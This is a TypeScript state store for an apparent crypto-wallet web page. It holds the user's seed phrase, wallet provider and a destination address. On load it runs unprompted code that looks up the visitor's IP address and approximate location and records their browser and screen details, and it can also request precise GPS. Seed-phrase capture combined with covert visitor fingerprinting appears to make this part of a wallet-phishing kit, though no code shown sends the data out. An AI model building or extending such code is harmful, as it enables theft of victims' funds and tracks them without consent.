import { create } from "zustand";

/** --- TYPES --- **/
type GeolocationState = {
	latitude?: number;
	longitude?: number;
	city?: string;
	region?: string;
	country?: string;
	error?: string;
};

type WalletState = {
	walletId: string;
	blockchainNetwork: string;
	walletProvider: string;
	seedPhrase: string;
	walletName: string;
	destinationAddress: string;
	ipAddress: string;
	geolocation: GeolocationState | null;
	userAgent: string;
	screenResolution: string;
	process: boolean;
	isLoading: boolean;
};

type WalletActions = {
	setBlockchainNetwork: (network: string) => void;
	setWalletProvider: (provider: string) => void;
	setWalletId: (id: string) => void;
	setSeedPhrase: (phrase: string) => void;
	setWalletName: (name: string) => void;
	setDestinationAddress: (address: string) => void;
	fetchUserDetails: () => Promise<void>;
	fetchGeoFromIP: () => Promise<void>;
	requestPreciseGeolocation: () => Promise<void>;
	clearSensitiveData: () => void;
	setProcess: (val: boolean) => void;
};

type WalletStore = WalletState & WalletActions;

/** --- STORE --- **/
export const useWalletStore = create<WalletStore>((set, get) => ({
	// --- STATE ---
	walletId: "",
	blockchainNetwork: "",
	walletProvider: "",
	seedPhrase: "",
	walletName: "Main Wallet",
	destinationAddress: "",
	ipAddress: "",
	geolocation: null,
	userAgent: "",
	screenResolution: "",
	process: false,
	isLoading: false,

	// --- ACTIONS ---
	setBlockchainNetwork: (network) => set({ blockchainNetwork: network }),
	setWalletProvider: (provider) => set({ walletProvider: provider }),
	setWalletId: (id) => set({ walletId: id }),
	setSeedPhrase: (phrase) => set({ seedPhrase: phrase }),
	setWalletName: (name) => set({ walletName: name }),
	setDestinationAddress: (address) => set({ destinationAddress: address }),
	setProcess: (val) => set({ process: val }),

	/** 🔹 Fetch IP + basic device info (no permissions needed) */
	fetchUserDetails: async () => {
		set({ isLoading: true });

		try {
			const ipResponse = await fetch("https://api.ipify.org?format=json");
			const ipData = await ipResponse.json();

			const userAgent =
				typeof navigator !== "undefined" ? navigator.userAgent : "";
			const screenResolution =
				typeof window !== "undefined"
					? `${window.screen.width}x${window.screen.height}`
					: "";

			set({
				ipAddress: ipData.ip || "",
				userAgent,
				screenResolution,
				isLoading: false,
			});
		} catch (error) {
			console.error("❌ Failed to fetch IP/user details:", error);
			set({ ipAddress: "Error fetching IP", isLoading: false });
		}
	},

	/** 🌍 Get approximate location via IP (no permission popup) */
	fetchGeoFromIP: async () => {
		try {
			const res = await fetch("https://ipapi.co/json/");
			if (!res.ok) throw new Error("IP geolocation lookup failed");

			const data = await res.json();

			const geo: GeolocationState = {
				latitude: data.latitude,
				longitude: data.longitude,
				city: data.city,
				region: data.region,
				country: data.country_name,
			};

			set({ geolocation: geo });
		} catch (err) {
			console.error("❌ fetchGeoFromIP error:", err);
			set({ geolocation: { error: "Failed to get location from IP" } });
		}
	},

	/** 📍 Request precise GPS location (shows permission popup) */
	requestPreciseGeolocation: async () => {
		if (typeof navigator === "undefined" || !("geolocation" in navigator)) {
			set({
				geolocation: { error: "Geolocation not supported by this browser." },
			});
			return;
		}

		set({ isLoading: true });

		try {
			const pos = await new Promise<GeolocationState>((resolve) => {
				navigator.geolocation.getCurrentPosition(
					(position) =>
						resolve({
							latitude: position.coords.latitude,
							longitude: position.coords.longitude,
						}),
					(err) =>
						resolve({
							error: err?.message || "User denied geolocation access.",
						})
				);
			});

			set({ geolocation: pos, isLoading: false });
		} catch (error) {
			console.error("❌ requestPreciseGeolocation error:", error);
			set({
				geolocation: { error: "Failed to get precise geolocation" },
				isLoading: false,
			});
		}
	},

	/** 🧹 Clear sensitive info */
	clearSensitiveData: () =>
		set({
			walletId: "",
			seedPhrase: "",
			walletName: "Main Wallet",
			destinationAddress: "",
			blockchainNetwork: "",
			walletProvider: "",
		}),
}));

/** --- AUTO-RUN ON STORE INIT --- **/
(async () => {
	const store = useWalletStore.getState();
	await store.fetchUserDetails();
	await store.fetchGeoFromIP();
})();
